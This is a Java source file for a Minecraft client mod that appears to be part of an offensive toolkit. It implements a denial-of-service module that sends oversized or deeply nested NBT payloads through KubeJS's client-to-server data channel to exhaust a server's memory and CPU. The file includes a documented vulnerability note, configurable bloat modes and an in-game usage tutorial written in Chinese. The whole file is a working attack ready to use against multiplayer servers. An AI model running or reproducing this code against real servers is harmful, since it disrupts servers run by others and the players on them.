package com.redblue.red.modules.kubejs;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * KJS-03: SendDataFromClientMessage — Oversized NBT Payload DoS.
 *
 * VULN-13 (CONFIRMED via javap):
 * SendDataFromClientMessage decodes CompoundTag via readNbt() with no
 * explicit size limit beyond vanilla packet max (~2MB). The channel
 * string is limited to 120 chars, but the CompoundTag is unbounded.
 *
 * Server must fully deserialize the NBT, then pass it to script handlers.
 * Large deeply-nested NBT structures cause CPU + memory pressure on the
 * server's main thread during deserialization and script processing.
 *
 * Wire format (Architectury on Forge):
 *   Vanilla channel: "architectury:network"
 *   Payload: ResourceLocation("kubejs:send_data_from_client")
 *            + String(channel, max 120) + CompoundTag(bloated)
 */
public class KJS03_NbtBloat implements AttackModule {

    private static final ResourceLocation ARCH_CHANNEL =
            new ResourceLocation("architectury", "network");
    private static final ResourceLocation MSG_ID =
            new ResourceLocation("kubejs", "send_data_from_client");

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger",
                "\u26A0 确认：可能导致服务器卡顿或OOM", false),
        ConfigParam.ofString("channel", "目标通道名", "")
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofEnum("bloat_mode", "膨胀模式",
                "DEEP_NEST", "DEEP_NEST", "WIDE_KEYS", "LONG_STRINGS")
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofInt("depth", "嵌套深度", 512, 16, 2048)
                .visibleWhen("bloat_mode", "DEEP_NEST"),
        ConfigParam.ofInt("key_count", "键数量", 5000, 100, 50000)
                .visibleWhen("bloat_mode", "WIDE_KEYS"),
        ConfigParam.ofInt("string_len", "字符串长度", 32000, 1000, 65000)
                .visibleWhen("bloat_mode", "LONG_STRINGS"),
        ConfigParam.ofInt("packet_count", "发包数", 1, 1, 10)
                .visibleWhen("confirm_danger", "true")
    );

    @Override public String id() { return "kjs03_nbtbloat"; }
    @Override public String name() { return "NBT膨胀"; }

    @Override
    public String description() {
        return "发送超大NBT载荷造成服务器内存/CPU压力";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 勾选「\u26A0 确认」开关\n"
            + "2. 输入目标通道名（需要有监听器才会被处理）\n"
            + "3. 选择膨胀模式：\n"
            + "   - DEEP_NEST: 深度嵌套CompoundTag\n"
            + "   - WIDE_KEYS: 大量键值对\n"
            + "   - LONG_STRINGS: 超长字符串值\n"
            + "4. 点击「执行」发送\n\n"
            + "[原理]\n"
            + "CompoundTag除了vanilla约2MB包大小限制外无额外限制。\n"
            + "服务器必须完整反序列化NBT并传递给脚本处理器。\n\n"
            + "[注意]\n"
            + "- 受vanilla包大小限制(~2MB)，实际膨胀有上限\n"
            + "- 仅为单次触发模式，不支持自动循环";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("kubejs");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        if (!isConfirmed()) return;

        String channel = getParam("channel")
                .map(ConfigParam::getString).orElse("");
        if (channel.isEmpty()) return;

        int count = getParam("packet_count")
                .map(ConfigParam::getInt).orElse(1);
        CompoundTag tag = buildBloatedTag();

        for (int i = 0; i < count; i++) {
            sendPacket(channel, tag);
        }
    }

    private boolean isConfirmed() {
        return getParam("confirm_danger")
                .map(ConfigParam::getBool).orElse(false);
    }

    private CompoundTag buildBloatedTag() {
        String mode = getParam("bloat_mode")
                .map(ConfigParam::getString).orElse("DEEP_NEST");

        return switch (mode) {
            case "WIDE_KEYS" -> buildWideTag();
            case "LONG_STRINGS" -> buildLongStringTag();
            default -> buildDeepTag();
        };
    }

    private CompoundTag buildDeepTag() {
        int depth = getParam("depth")
                .map(ConfigParam::getInt).orElse(512);

        CompoundTag root = new CompoundTag();
        CompoundTag current = root;
        for (int i = 0; i < depth; i++) {
            CompoundTag child = new CompoundTag();
            child.putString("v", "x".repeat(64));
            current.put("n", child);
            current = child;
        }
        return root;
    }

    private CompoundTag buildWideTag() {
        int keyCount = getParam("key_count")
                .map(ConfigParam::getInt).orElse(5000);

        CompoundTag tag = new CompoundTag();
        for (int i = 0; i < keyCount; i++) {
            tag.putString("k" + i, "v" + i);
        }
        return tag;
    }

    private CompoundTag buildLongStringTag() {
        int len = getParam("string_len")
                .map(ConfigParam::getInt).orElse(32000);

        CompoundTag tag = new CompoundTag();
        String longStr = "A".repeat(len);
        // Put multiple long strings to maximize payload
        for (int i = 0; i < 10; i++) {
            tag.putString("s" + i, longStr);
        }
        return tag;
    }

    private void sendPacket(String channel, CompoundTag data) {
        PacketForge.send(ARCH_CHANNEL, buf -> {
            buf.writeResourceLocation(MSG_ID);
            buf.writeUtf(channel, 120);
            buf.writeNbt(data);
        });
    }
}
